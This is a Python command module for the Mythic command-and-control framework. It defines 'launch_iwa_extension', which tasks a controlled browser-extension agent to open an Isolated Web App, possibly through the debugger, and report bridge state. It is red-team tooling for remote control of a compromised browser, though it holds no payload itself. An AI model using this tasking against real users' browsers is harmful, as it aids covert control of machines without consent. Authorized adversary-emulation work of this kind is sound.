from mythic_container.MythicCommandBase import *


class LaunchIwaExtensionArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="method",
                type=ParameterType.String,
                description="Launch method: window, minimized, tab, or debugger.",
                parameter_group_info=[ParameterGroupInfo(required=False)],
                default_value="window",
            ),
            CommandParameter(
                name="window_mode",
                type=ParameterType.String,
                description="Window mode for method=window: minimized, normal, or small.",
                parameter_group_info=[ParameterGroupInfo(required=False)],
                default_value="minimized",
            ),
            CommandParameter(
                name="iwa_url",
                type=ParameterType.String,
                description="Optional isolated-app:// URL. Defaults to the build-time IWA URL.",
                parameter_group_info=[ParameterGroupInfo(required=False)],
                default_value="",
            ),
            CommandParameter(
                name="wait_ms",
                type=ParameterType.Number,
                description="Milliseconds to wait before reporting bridge state.",
                parameter_group_info=[ParameterGroupInfo(required=False)],
                default_value=3000,
            ),
        ]

    async def parse_arguments(self):
        command_line = self.command_line.strip()
        if not command_line:
            return
        if command_line[0] == "{":
            self.load_args_from_json_string(command_line)
            return

        parts = command_line.split()
        self.add_arg("method", parts[0])
        if len(parts) > 1:
            self.add_arg("iwa_url", parts[1])


class LaunchIwaExtensionCommand(CommandBase):
    cmd = "launch_iwa_extension"
    needs_admin = False
    help_cmd = "launch_iwa_extension [window|minimized|tab|debugger] [isolated-app://...]"
    description = "Ask the extension to launch or navigate to the configured IWA."
    version = 1
    author = "@kingofthenops"
    attackmapping = []
    argument_class = LaunchIwaExtensionArguments
    attributes = CommandAttributes(spawn_and_injectable=False)

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        method = taskData.args.get_arg("method") or "debugger"
        iwa_url = taskData.args.get_arg("iwa_url") or ""
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams=f"{method} {iwa_url}".strip(),
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
